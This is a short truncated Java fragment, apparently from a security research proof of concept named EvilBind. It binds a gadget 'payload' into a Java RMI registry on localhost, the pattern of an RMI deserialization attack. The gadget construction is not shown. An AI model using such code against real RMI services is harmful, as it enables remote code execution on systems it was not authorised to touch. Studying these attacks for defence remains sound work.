...
public class EvilBind {
    public static void main(String[] args) throws Exception {

        Registry reg = LocateRegistry.getRegistry("127.0.0.1",1099);
        Remote payload = getGadget("127.0.0.1", 8888);

        //Remote payload = getGadget2("127.0.0.1", 8888);
        reg.bind("test12", payload);
        //Naming.rebind(reg, "name", payload);
